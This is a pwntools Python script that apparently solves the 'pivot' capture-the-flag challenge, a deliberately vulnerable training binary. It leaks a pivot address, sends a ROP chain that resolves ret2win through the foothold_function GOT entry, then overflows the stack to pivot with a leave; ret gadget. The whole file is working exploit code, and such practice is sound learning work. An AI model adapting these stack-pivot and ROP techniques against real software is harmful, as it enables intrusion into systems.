from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./pivot')
rop = ROP(elf)
io = process(elf.path)
libpivot = ELF('./libpivot.so')

bss = elf.bss()

offset_ret2win = libpivot.symbols['ret2win'] - libpivot.symbols['foothold_function']
offset_to_rbp = 32
leave_ret = rop.find_gadget(['leave', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
mov_rax_qptr_rax = 0x4009c0
pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]
add_rax_rbp = 0x4009c4 
jmp_rax = 0x4007c1 
foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']

io.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: ')
pivot_leak = io.recvline().strip() 
pivot_addr = int(pivot_leak, 16)
log.success(f'address to pivot: {hex(pivot_addr)}')

rop_payload = b'FAKE_RBP'
rop_payload += p64(foothold_plt)
rop_payload += p64(pop_rax)
rop_payload += p64(foothold_got)
rop_payload += p64(mov_rax_qptr_rax)
rop_payload += p64(pop_rbp)
rop_payload += p64(offset_ret2win)
rop_payload += p64(add_rax_rbp)
rop_payload += p64(jmp_rax)

io.recvuntil(b'> ')
io.sendline(rop_payload)

pivot_payload = b'A' * offset_to_rbp
pivot_payload += p64(pivot_addr)
pivot_payload += p64(leave_ret)

io.recvuntil(b'> ')
io.sendline(pivot_payload)

io.interactive()

